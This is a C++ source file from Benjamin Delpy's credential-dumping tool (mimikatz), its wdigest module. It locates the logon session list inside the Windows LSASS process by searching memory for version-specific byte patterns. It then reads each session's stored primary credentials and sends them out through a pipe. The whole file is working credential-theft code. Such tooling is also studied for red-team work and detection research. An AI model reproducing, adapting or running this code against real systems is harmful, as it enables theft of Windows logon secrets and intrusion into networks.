/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include "wdigest.h"

PKIWI_WDIGEST_LIST_ENTRY l_LogSessList = NULL;
long offsetWDigestPrimary = 0;

bool searchWDigestEntryList()
{
#ifdef _M_X64
	BYTE PTRN_WNO8_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x89, 0x5b, 0x08, 0x48, 0x8d};
	BYTE PTRN_W8CP_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x4b, 0x08, 0x49, 0x8b, 0x43, 0x08, 0x4c, 0x39};
	BYTE PTRN_W8RP_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
#elif defined _M_IX86
	BYTE PTRN_WNO8_InsertInLogSess[]= {0x8b, 0x45, 0x08, 0x89, 0x08, 0xc7, 0x40, 0x04};
	BYTE PTRN_W8CP_InsertInLogSess[]= {0x89, 0x0e, 0x89, 0x56, 0x04, 0x8b, 0x41, 0x04};
	BYTE PTRN_W8RP_InsertInLogSess[]= {0x89, 0x06, 0x89, 0x4e, 0x04, 0x39, 0x48, 0x04};
#endif
	LONG OFFS_WALL_InsertInLogSess	= -4;

	if(!l_LogSessList)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		pointeur= reinterpret_cast<PBYTE *>(&l_LogSessList);
		offset	= OFFS_WALL_InsertInLogSess;
		if(mod_system::GLOB_Version.dwBuildNumber < 8000)
		{
			pattern	= PTRN_WNO8_InsertInLogSess;
			taille	= sizeof(PTRN_WNO8_InsertInLogSess);
		}
		else if(mod_system::GLOB_Version.dwBuildNumber < 8400)
		{
			pattern	= PTRN_W8CP_InsertInLogSess;
			taille	= sizeof(PTRN_W8CP_InsertInLogSess);
		}
		else
		{
			pattern	= PTRN_W8RP_InsertInLogSess;
			taille	= sizeof(PTRN_W8RP_InsertInLogSess);
		}


		mod_memory::genericPatternSearch(pointeur, L"wdigest", pattern, taille, offset, "SpInstanceInit", false);

#ifdef _M_X64
		offsetWDigestPrimary = ((mod_system::GLOB_Version.dwMajorVersion < 6) ? ((mod_system::GLOB_Version.dwMinorVersion < 2) ? 36 : 48) : 48);
#elif defined _M_IX86
		offsetWDigestPrimary = ((mod_system::GLOB_Version.dwMajorVersion < 6) ? ((mod_system::GLOB_Version.dwMinorVersion < 2) ? 36 : 28) : 32);
#endif
	}
	return (searchLSAFuncs() && l_LogSessList);
}

__kextdll bool __cdecl getWDigest(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getWDigestLogonData, wstring(L"wdigest")));
	return getLogonData(monPipe, mesArguments, &monProvider);
}

__kextdll bool __cdecl getWDigestFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** wdigest.dll/lsasrv.dll ** ; Research Status : " << (searchWDigestEntryList() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@l_LogSessList      = " << l_LogSessList << endl <<
		L"@LsaUnprotectMemory = " << SeckPkgFunctionTable->LsaUnprotectMemory << endl;
	return sendTo(monPipe, monStream.str());
}

bool WINAPI getWDigestLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream maReponse;
	if(searchWDigestEntryList())
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		if(PKIWI_WDIGEST_LIST_ENTRY pLogSession = reinterpret_cast<PKIWI_WDIGEST_LIST_ENTRY>(getPtrFromLinkedListByLuid(reinterpret_cast<PLIST_ENTRY>(l_LogSessList), FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), logId)))
		{
			mesCreds = reinterpret_cast<PKIWI_GENERIC_PRIMARY_CREDENTIAL>(reinterpret_cast<PBYTE>(pLogSession) + offsetWDigestPrimary);
		}
		genericCredsToStream(&maReponse, mesCreds, justSecurity);
	}
	else maReponse << L"n.a. (wdigest KO)";

	return sendTo(monPipe, maReponse.str());
}